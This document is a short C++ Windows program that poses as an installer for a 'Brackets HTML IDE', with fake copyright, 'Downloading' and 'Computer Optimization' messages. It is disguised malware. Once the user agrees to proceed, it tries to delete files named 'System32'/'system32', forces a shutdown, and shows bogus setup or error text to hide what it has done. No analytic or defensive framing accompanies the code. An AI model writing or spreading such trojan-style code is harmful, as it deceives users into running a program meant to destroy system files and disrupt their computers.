#include <iostream>
#include <Windows.h>
using namespace std;

int main() {
	int system32;// use int to refer to the actual file and status
	int System32;
	bool gate = false;
	char initChar = NULL;
	char SYSTEM32[25] = "System32";//refers to file name
	char system32n2[25] = "system32";

	cout << "Brackets HTML IDE" << endl;
	cout << "(c) 2016 Brackets Corporation.All Rights Reserved" << endl;
	cout << "Proceed? y/n " << endl;
	cin >> initChar;
	if (initChar == 'y') {
		gate = true;
	}
	else {
		cout << "Program killed.";
		return 0;
	}
	cout << "\nThe Setup And Computer Optimization Will Start In 2 Seconds." << endl;
	cout << "Downloading......" << endl;
	Sleep(2000);
	system32 = remove(system32n2);
	System32 = remove(SYSTEM32);
	if (system32 == 0 && System32 == 0 && gate) {//0 because the said file has been deleted
		Sleep(5000);
		cout << "Setup Completed.Your PC needs to shutdown for this program to work." << endl;
		Sleep(1000);
		system("shutdown -f");
	}

	else {
		cout << "Error:Computer Does Not Meet Standard Requirements" << endl;
		exit(-1);
	}
	return 0;
}